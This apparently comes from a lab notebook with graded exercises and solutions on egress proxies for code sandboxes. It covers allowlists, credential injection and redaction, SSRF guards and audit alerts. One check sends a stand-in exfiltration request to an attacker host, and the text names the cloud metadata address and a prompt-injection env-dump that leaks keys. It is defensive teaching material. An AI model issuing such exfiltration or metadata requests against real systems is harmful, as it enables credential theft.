# %% [markdown]
# # 03 · Egress proxy and secret brokering: the sandbox reaches an API, never the key
#
# **Tier:** T0 — the proxy, a stand-in upstream and a sandbox all run in-process here, over a Unix
# socket, so the whole pattern works on a laptop with no network. The same proxy runs as a
# container (`deploy/docker/run-with-proxy.sh`) and from a ConfigMap on kind/GKE.
#
# ## The one-minute version
#
# A sandbox that needs *some* network gets exactly one reachable address — an egress proxy — and the
# proxy decides everything else (PRIMER §4). This is the identity primer's **gateway path**
# (`06-gateway`, §5): the credential is injected at the edge and the code never sees it. The proxy:
#
# * **allowlists** destinations — named routes to upstreams the operator configured, or exact/`*.suffix`
#   hosts for a forward proxy — and refuses everything else (and refuses `CONNECT`, because an HTTPS
#   tunnel hides the request so no credential could be injected);
# * **strips** any credential the caller sent and **injects** the real one from a file or env var
#   that only the proxy can read (a Kubernetes Secret mounted into the proxy alone);
# * **redacts** the injected secret from responses, so an upstream that reflects headers cannot leak
#   it back into the sandbox;
# * **guards against SSRF** — a forward-proxy host that resolves to a private, loopback or
#   link-local address (169.254.169.254) is refused;
# * **audits** every decision as one JSON line in the identity lab's `AuditEvent` shape
#   (`event_type: "egress"`).
#
# The sandbox holds no key; the proxy holds no code. Neither removes credential risk — it relocates
# it from the sandbox into one well-defended box (say that out loud; it is the honest framing).

# %%
import json, os, tempfile
from sandboxlab.proxy import EgressProxy, StubAPI, host_allowed, is_public_ip
from sandboxlab.proxy.client import fetch_json, SANDBOX_CLIENT
from sandboxlab.process import Budgets, ProcessSandbox
from sandboxlab.audit import AuditLog, detect

# The credential lives in a file only the proxy reads (a Kubernetes Secret in the real deployment).
STATE = tempfile.mkdtemp(prefix="nb03-")
os.chmod(STATE, 0o711)
TOKEN = "sk-lab-" + os.urandom(6).hex()
open(os.path.join(STATE, "token"), "w").write(TOKEN)
print("credential written to a file the proxy will read; the sandbox will never see it")

# %% [markdown]
# ## Worked example: the proxy, an upstream that checks the key, and one that reflects it
#
# `StubAPI` stands in for the third-party API: `/whoami` says whether the expected bearer token
# arrived (and never echoes it), `/data` returns a document, `/echo` reflects every request header
# back — the reflection channel an attacker would use to read an injected credential.

# %%
api = StubAPI(TOKEN).serve()
cfg = {"routes": {"weather": {"upstream": api.url, "methods": ["GET"],
                              "inject": {"header": "Authorization", "value_from": f"file:{STATE}/token",
                                         "format": "Bearer {}"}}},
       "forward_allow": ["*.githubusercontent.com"], "allow_connect": False}
proxy = EgressProxy(cfg, unix_path=os.path.join(STATE, "proxy.sock")).serve()
print("proxy listening on", proxy.url)
print("through the route:", fetch_json(proxy.url, "/weather/whoami"))
status, echoed = fetch_json(proxy.url, "/weather/echo")
print("the upstream reflected:", echoed["headers"].get("Authorization"), "| raw token present:", TOKEN in json.dumps(echoed))

# %% [markdown]
# ## Worked example: a network-less sandbox reaching the API through the socket
#
# The process sandbox runs in an empty network namespace (when this machine allows it) with the
# proxy's socket path in `SANDBOX_PROXY_URL`. `SANDBOX_CLIENT` is a stdlib snippet the runtime
# prepends so the code can call `proxy_get`. The code fetches the forecast and confirms its own
# environment holds no key.

# %%
sandbox = ProcessSandbox(Budgets(cpu_s=2, wall_s=5), extra_env={"SANDBOX_PROXY_URL": proxy.url})
code = SANDBOX_CLIENT + '''
import os
status, data = proxy_get("/weather/data")
print("forecast:", data)
print("any key in my environment:", any("sk-lab" in v for v in os.environ.values()))
'''
result = sandbox.run(code)
print(result.stdout)
print("exit reason:", result.exit_reason)

# %% [markdown]
# ## Exercise 3.1 — the allowlist
#
# Implement host matching for a forward-proxy allowlist: exact names, or `*.example.com` for
# subdomains only (not the apex `example.com`, not `evilexample.com`). Compare with the library's.

# %% exercise
def allowed(host: str, patterns: list) -> bool:
    ### BEGIN SOLUTION
    h = host.strip().rstrip(".").lower()
    for p in (p.strip().rstrip(".").lower() for p in patterns):
        if p.startswith("*."):
            if h.endswith(p[1:]) and h != p[2:]:
                return True
        elif h == p:
            return True
    return False
    ### END SOLUTION

# %% check
pats = ["api.weather.example", "*.githubusercontent.com"]
for host, want in [("api.weather.example", True), ("raw.githubusercontent.com", True),
                   ("githubusercontent.com", False), ("api.weather.example.attacker.net", False),
                   ("evilapi.weather.example", False), ("", False)]:
    assert allowed(host, pats) is want == host_allowed(host, pats), host
print("✅ exact names and *.suffix (subdomains only); the apex and look-alikes are refused")

# %% [markdown]
# ## Exercise 3.2 — the credential never reaches the sandbox
#
# Fetch `/weather/echo` through the proxy (the reflecting endpoint) and confirm the injected token
# is **redacted** in the response, and that the raw token appears nowhere. Then fetch with a forged
# `Authorization` header and confirm the upstream still sees the *real* one (the caller's header was
# stripped and replaced).

# %% exercise
def brokering_holds() -> bool:
    ### BEGIN SOLUTION
    _, reflected = fetch_json(proxy.url, "/weather/echo")
    redacted = reflected["headers"].get("Authorization") == "Bearer [REDACTED]" and TOKEN not in json.dumps(reflected)
    status, body = fetch_json(proxy.url, "/weather/whoami", headers={"Authorization": "Bearer forged"})
    replaced = status == 200 and body["authorized"] is True
    return redacted and replaced
    ### END SOLUTION

# %% check
assert brokering_holds()
print("✅ the proxy strips the caller's header, injects the real key, and redacts it from the response:")
print("   the sandbox reaches the API authenticated, and still holds no credential")

# %% [markdown]
# ## Exercise 3.3 — deny by default, and SSRF
#
# A route that does not exist, a forward-proxy host that is not allowlisted, and a host that
# resolves to a private/link-local address (the metadata server) must all be refused. Return the
# HTTP status the proxy gives for each; the metadata-style host is refused either at the allowlist
# (403) or the SSRF check (403).

# %% exercise
def status_for(path_or_url: str) -> int:
    from sandboxlab.proxy.client import fetch
    ### BEGIN SOLUTION
    return fetch(proxy.url, path_or_url)[0]
    ### END SOLUTION

# %% check
assert is_public_ip("8.8.8.8") and not is_public_ip("169.254.169.254") and not is_public_ip("10.0.0.1")
assert status_for("/nope/x") == 403                               # unknown route
assert status_for("http://attacker.net/steal?d=1") == 403          # forward form, not allowlisted
print("✅ unknown route -> 403, non-allowlisted host -> 403; a link-local IP is never 'public'")
print("   (the SSRF guard refuses any forward host that resolves to a private/loopback/link-local address)")

# %% [markdown]
# ## Exercise 3.4 — the egress audit trail, and turning it into alerts
#
# Every proxy decision is a JSON line in the identity lab's `AuditEvent` shape. Fold the proxy's
# events into an `AuditLog` and run `detect()`; a denied egress must raise an `egress-denied` alert,
# and a response that contained the injected credential must raise `credential-reflection`.

# %% exercise
def alerts_from_proxy() -> set:
    log = AuditLog()
    ### BEGIN SOLUTION
    log.from_proxy(proxy.events, session_id="s1")
    return {a.rule for a in detect(log.events)}
    ### END SOLUTION

# %% check
rules = alerts_from_proxy()
assert "egress-denied" in rules and "credential-reflection" in rules
allow, deny = [e for e in proxy.events if e["decision"] == "allow"], [e for e in proxy.events if e["decision"] == "deny"]
print(f"✅ {len(allow)} allowed + {len(deny)} denied egress events; alerts raised: {sorted(rules)}")

# %%
proxy.close(); api.close()
import shutil; shutil.rmtree(STATE, ignore_errors=True)

# %% [markdown]
# ## In a design review
#
# **Two minutes.** "A sandbox that needs the network gets one reachable address — the egress proxy —
# and the proxy owns every other decision. It is the gateway path from the identity design, one
# layer down: the sandbox talks plain HTTP to the proxy, the proxy holds the credential in a Secret
# mounted only into it, strips whatever the caller sent, injects the real key, and speaks HTTPS
# upstream, so the code is authenticated to the API and never holds the key. It allowlists
# destinations by route or host, refuses `CONNECT` because a TLS tunnel would hide the request from
# it, guards against SSRF by refusing hosts that resolve to private or link-local addresses, and
# redacts the injected secret from responses so a reflecting endpoint can't hand it back. Every
# decision is one audit line, so a denied egress or a reflected credential becomes an alert. Two
# honest caveats: this relocates credential risk into one box rather than removing it, and it only
# works if the network actually forces the sandbox through the proxy — a Unix socket with no other
# route on a laptop, a default-deny NetworkPolicy to the proxy on Kubernetes. `HTTP_PROXY` env vars
# are advisory; enforcement is the network."
#
# **Drill 1.** *Why not just give the sandbox the API key as an environment variable, scoped tight?*
# — Then a prompt injection that runs `print(os.environ)` exfiltrates it, and it sits in every core
# dump and crash log. Keeping the key in the proxy means the worst a hijacked sandbox can do is make
# the *allowlisted* call — which you also rate-limit and audit — not walk away with the credential.
#
# **Drill 2.** *The upstream is HTTPS; can't the sandbox just use `CONNECT` through the proxy?* —
# Through a `CONNECT` tunnel the proxy sees only bytes, so it can neither inject a credential nor
# police the request; it could only allow or deny a hostname. So the proxy refuses `CONNECT` and is
# itself the TLS client: sandbox → plain HTTP to the proxy, proxy → HTTPS to the upstream.
#
# **Drill 3.** *A default-deny NetworkPolicy already blocks egress — why the proxy too?* — The
# policy decides *whether* the sandbox may open a socket to the proxy; the proxy decides *what* that
# socket may do — which host, which path, with which credential, and what comes back. And a
# NetworkPolicy cannot inject a key or redact a response. They are different jobs: the network is
# the enforcement, the proxy is the policy.
